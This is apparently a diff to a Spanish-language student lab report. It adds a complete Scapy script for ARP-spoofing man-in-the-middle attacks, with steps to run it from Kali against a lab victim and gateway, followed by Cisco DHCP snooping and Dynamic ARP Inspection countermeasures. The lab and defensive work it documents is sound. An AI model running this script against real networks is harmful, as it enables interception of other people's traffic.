@@ -41,10 +41,162 @@ Enviar respuestas ARP falsas tanto a la víctima como al gateway, asociando la M
 6. Al detener con Ctrl+C restaura las tablas ARP originales
 
 ```bash
-sudo python3 arp_mitm.py <victima> <gateway> <interfaz>
-sudo python3 arp_mitm.py 10.13.32.11 10.13.32.1 eth0
-```
+ Crear y guardar el script:
+bash
+nano /home/kali-linux/arp_mitm.py
 
+Pega el contenido del script, luego guarda con Ctrl+O → Enter → Ctrl+X
+
+Dar permisos de ejecución:
+bash
+chmod +x /home/kali-linux/arp_mitm.py
+
+Pasos de ejecución
+
+Paso 1 — VPC1: Ver ARP limpio antes del ataque
+bash
+ping 10.13.32.1
+show arp
+
+Se debe ver la MAC real de R1:
+aa:bb:cc:00:01:00  10.13.32.1
+
+Paso 2 — Kali: Ejecutar el ataque
+bash
+sudo python3 /home/kali-linux/arp_mitm.py 10.13.32.11 10.13.32.1 eth0
+
+Paso 3 — VPC1: Ver ARP envenenado
+bash
+show arp
+
+La MAC de R1 ahora apunta a la MAC de Kali
+
+Paso 4 — SW1: Aplicar contramedida (sin detener Kali)
+bash
+conf t
+ip dhcp snooping
+ip dhcp snooping vlan 10
+ip dhcp snooping vlan 20
+no ip dhcp snooping information option
+interface e0/0
+ ip dhcp snooping trust
+ ip arp inspection trust
+exit
+ip arp inspection vlan 10
+ip arp inspection vlan 20
+end
+write memory
+
+Paso 5 — VPC1: Ver ARP limpio de nuevo
+bash
+show arp
+
+Paso 6 — SW1: Verificar que está bloqueando
+bash
+show ip arp inspection statistics
+
+Paso 7 — Kali: Detener el ataque
+Ctrl+C
+
+Paso 8 — SW1: Revertir contramedida (entorno de laboratorio)
+bash
+conf t
+no ip arp inspection vlan 10
+no ip arp inspection vlan 20
+no ip dhcp snooping
+end
+write memory
+
+🐍 Script — arp_mitm.py
+python#!/usr/bin/env python3
+# =============================================================
+# Nombre:     Henry Vicente Quezada
+# Matricula:  2025-1332
+# Ataque:     ARP Spoofing - MitM
+# Fecha:      2026
+# =============================================================
+from scapy.all import *
+import time
+import sys
+import os
+
+def get_mac(ip, iface):
+    arp_req = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    pkt = broadcast / arp_req
+    answered = srp(pkt, timeout=2, iface=iface, verbose=False)[0]
+    if answered:
+        return answered[0][1].hwsrc
+    else:
+        print(f"[-] No se pudo obtener MAC de {ip}")
+        return None
+
+def spoof(target_ip, spoof_ip, iface):
+    target_mac = get_mac(target_ip, iface)
+    if not target_mac:
+        return
+    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(pkt, verbose=False, iface=iface)
+
+def restore(dest_ip, src_ip, iface):
+    dest_mac = get_mac(dest_ip, iface)
+    src_mac = get_mac(src_ip, iface)
+    if dest_mac and src_mac:
+        pkt = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
+                  psrc=src_ip, hwsrc=src_mac)
+        send(pkt, count=4, verbose=False, iface=iface)
+
+def arp_mitm(victima_ip, gateway_ip, iface):
+    print("=" * 55)
+    print("       ATAQUE MitM - ARP SPOOFING")
+    print("       Autor:     Henry Vicente Quezada")
+    print("       Matricula: 2025-1332")
+    print("=" * 55)
+    print(f"[*] Victima  : {victima_ip}")
+    print(f"[*] Gateway  : {gateway_ip}")
+    print(f"[*] Interfaz : {iface}")
+    print(f"[*] Presiona Ctrl+C para detener\n")
+
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    enviados = 0
+    try:
+        while True:
+            spoof(victima_ip, gateway_ip, iface)
+            spoof(gateway_ip, victima_ip, iface)
+            enviados += 2
+            print(f"\r[+] Paquetes ARP enviados: {enviados}", end="")
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print(f"\n[*] Restaurando ARP...")
+        restore(victima_ip, gateway_ip, iface)
+        restore(gateway_ip, victima_ip, iface)
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        print(f"[✓] Listo.")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("\nUso: sudo python3 arp_mitm.py <victima> <gateway> <interfaz>")
+        print("Ejemplo: sudo python3 arp_mitm.py 10.13.32.11 10.13.32.1 eth0\n")
+        sys.exit(1)
+
+    arp_mitm(sys.argv[1], sys.argv[2], sys.argv[3])
+
+🛡️ Contramedidas aplicada:
+
+SW1(config)# ip dhcp snooping
+SW1(config)# ip dhcp snooping vlan 10
+SW1(config)# ip dhcp snooping vlan 20
+SW1(config)# no ip dhcp snooping information option
+SW1(config)# interface e0/0
+SW1(config-if)# ip dhcp snooping trust
+SW1(config-if)# ip arp inspection trust
+SW1(config)# ip arp inspection vlan 10
+SW1(config)# ip arp inspection vlan 20
+
+! Verificación
+SW1# show ip arp inspection statistics
+SW1# show ip arp inspection
+```
 ---
 
 ## 4. Documentación de la Red
@@ -102,24 +254,6 @@ sudo python3 arp_mitm.py 10.13.32.11 10.13.32.1 eth0
 
 > 📷 `SW1# show ip arp inspection statistics` — paquetes ARP bloqueados
 
----
-
-## 6. Contramedidas
-
-```
-SW1(config)# ip dhcp snooping
-SW1(config)# ip dhcp snooping vlan 10
-SW1(config)# ip dhcp snooping vlan 20
-SW1(config)# no ip dhcp snooping information option
-SW1(config)# interface e0/0
-SW1(config-if)# ip dhcp snooping trust
-SW1(config-if)# ip arp inspection trust
-SW1(config)# ip arp inspection vlan 10
-SW1(config)# ip arp inspection vlan 20
-
-! Verificación
-SW1# show ip arp inspection statistics
-SW1# show ip arp inspection
 ```
 
 DAI valida cada paquete ARP contra la tabla de DHCP Snooping. Si la MAC/IP no coincide con un binding conocido, el paquete es descartado. El puerto hacia R1 se marca como trust para permitir su tráfico ARP legítimo.
